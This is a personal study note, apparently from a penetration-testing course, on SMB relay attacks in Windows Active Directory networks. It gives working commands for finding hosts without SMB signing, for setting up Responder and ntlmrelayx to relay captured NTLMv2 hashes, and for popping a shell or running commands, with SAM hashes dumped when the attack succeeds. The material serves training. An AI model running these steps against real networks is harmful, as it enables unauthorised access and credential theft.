---
tags:
  - PEH
---
## What is SMB Relay?
### Definition
Instead of cracking hashes gathered with responder (just as in [[LLMNR Poisoning]]), we can instead relay those hashes to specific machines and potentially gain access.

Let's assume machine (A) has the same password as machine (B), and machine (A) has administrator privileges on machine (B). If the NTLMv2 hash of machine (A) is captured (without the need of cracking it), it can be relayed to machine (B) and get access to machine (B).

The main advantage of SMB Relay is that you DO NOT need to crack the hash to get the password.
### Requirements and identification
#### Requirements
- SMB singing **must be** disabled or not enforced on the target (==This is the default setting==)
- Relayed user credentials must be admin on other's machine for any real value (==Keep in your mind that you CAN NOT relay to your self==). So that means the captured relayed credentials MUST be local admin on a different machine.
#### Identify hosts without SMB signing
To identify whether the host has SMB signing enabled or not (don't forget to run [[Scanning with Nmap - المسح باستخدام إن ماب|netdiscover tool first]]):
```bash
nmap --script=smb2-security-mode.nse -p445 <ip-address> -Pn
```

>[!NOTE] No results for alive hosts
>Sometimes you scan hosts that you're 100% sure that they're alive but nmap shows no results or says something like "Host seems down". To mitigate this problem use the flag -Pn
### Executing SMB Relay attack
1. Edit the configuration of responder, turn of both HTTP and SMB because we want to make sure that the hashes captured are being relayed
```bash
# Run responder config using your favourite editor
sudo mousepad /etc/responder/Responder.conf
sudo nvim /etc/responder/Responder.conf
```

2. Set up responder (BUT DO NOT RUN)
```bash
# Run one of the following commands:
sudo responder -I <interface> -dwv
sudo responder -I <interface> -dPv
```

3. Set up relay tool
```bash
ntlmrelayx.py -tf targets.txt -smb2support
# targets.txt inculdes the hosts that we identified with SMB signing disabled
# Add -i at the end of the command above to pop a shell
# Add -c [COMMAND] to execute a command
```

4. Run `ntlmrelay` then `responder`
5. Capture an event
6. Gain access (==Potentially==)

>[!NOTE] Dumped SAM hashes (LM:NT)
>This tool will Dump SAM hashes if the attack is successful, these hashes can be useful for [[Gaining shell access (in AD)|gaining shell access using MS]] or [[Pass Attacks]].
## SMB Relay mitigation
![[SMB Relay mitigation.png]]